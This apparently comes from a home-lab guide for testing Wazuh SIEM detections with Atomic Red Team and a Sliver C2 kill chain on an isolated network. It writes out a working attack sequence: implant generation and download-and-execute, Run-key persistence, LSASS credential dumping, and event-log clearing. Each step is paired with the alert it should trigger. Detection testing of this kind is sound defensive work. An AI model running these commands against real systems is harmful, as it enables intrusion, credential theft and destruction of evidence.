# Step 8: Attack Simulation

Execute a realistic kill chain using Sliver C2 and Atomic Red Team. This step generates the detectable activity that validates your SIEM rules.

> **Safety:** All attacks are confined to the UTM shared network (192.168.64.0/24). No traffic reaches the home LAN or internet. Verify this before running.

---

## Pre-Flight Checklist

- [ ] wazuh-manager running and all services healthy
- [ ] victim-windows online and Wazuh agent showing Active in Kibana
- [ ] kali-attacker online
- [ ] Kibana dashboard open at `https://192.168.64.10:5601` (monitor in real time)
- [ ] Note start time — you'll use it for incident report timeline

---

## Scenario 1: Atomic Red Team — Isolated Technique Testing

Test individual MITRE ATT&CK techniques before running a full kill chain.

```powershell
# [windows] Import ART module
Import-Module invoke-atomicredteam

# T1059.001 — PowerShell Execution
Invoke-AtomicTest T1059.001 -TestNumbers 1

# T1547.001 — Registry Run Key persistence
Invoke-AtomicTest T1547.001 -TestNumbers 1

# T1003.001 — Credential Dumping via LSASS
Invoke-AtomicTest T1003.001 -TestNumbers 1

# T1070.001 — Event Log Clearing
Invoke-AtomicTest T1070.001 -TestNumbers 1

# T1055 — Process Injection
Invoke-AtomicTest T1055 -TestNumbers 1
```

After each test: check Kibana → Wazuh → Alerts and verify a corresponding alert fired.

---

## Scenario 2: Sliver C2 Full Kill Chain

### Phase 1 — Reconnaissance (from Kali)

```bash
# [kali]
nmap -sV -sC -p 22,80,135,139,443,445,3389,5985 192.168.64.20
```

**Expected Wazuh alert:** Rule 40101 (port scan detection)

### Phase 2 — Implant Generation (Kali)

```bash
# [kali] Start Sliver server
sudo sliver-server daemon &

# Connect client
sliver

# Generate HTTPS implant for Windows ARM64
sliver > generate --https 192.168.64.30 --os windows --arch arm64 --name lab-implant --save /tmp/
sliver > https --lport 443
sliver > jobs  # Verify listener is active
```

### Phase 3 — Implant Delivery (Manual)

Copy the implant to the Windows VM via shared folder or Kali's Python HTTP server:

```bash
# [kali] Serve implant over HTTP
cd /tmp
python3 -m http.server 8080
```

```powershell
# [windows] Download and execute implant (simulates phishing/download)
Invoke-WebRequest -Uri http://192.168.64.30:8080/lab-implant.exe -OutFile C:\Temp\update.exe
C:\Temp\update.exe
```

**Expected Wazuh alerts:**
- Sysmon EventID 11 (file create in C:\Temp)
- Sysmon EventID 1 (process create: update.exe)
- DNS query to 192.168.64.30

### Phase 4 — Persistence

```
# [kali — Sliver prompt, after implant connects]
sliver > use [SESSION_ID]
sliver (lab-implant) > execute -- reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /t REG_SZ /d C:\Temp\update.exe /f
```

**Expected Wazuh alert:** Sysmon EventID 13 (registry value set in Run key)

### Phase 5 — Credential Access

```
sliver (lab-implant) > procdump --pid [LSASS_PID] --save /tmp/lsass.dmp
```

**Expected Wazuh alert:** Sysmon EventID 10 (OpenProcess on lsass.exe) → custom rule "Credential dumping via LSASS access"

### Phase 6 — Defense Evasion (Log Clearing)

```powershell
# [windows — via Sliver shell]
wevtutil cl Security
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

**Expected Wazuh alert:** Rule 18145 (Windows Security event log cleared) — fires because Wazuh read the EventID 1102 before clearing.

---

## Recording Results

For each phase, record in a new incident report using the [TEMPLATE](../incident-reports/TEMPLATE.md):

- Timestamp of alert in Kibana
- Rule ID and rule level that fired
- Raw Sysmon event data
- Whether detection fired before, during, or after the attack step

---

## Cleanup

```powershell
# [windows] Remove persistence and implant
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name updater
Remove-Item C:\Temp\update.exe -Force

# Restart Wazuh agent to re-sync
Restart-Service WazuhSvc
```
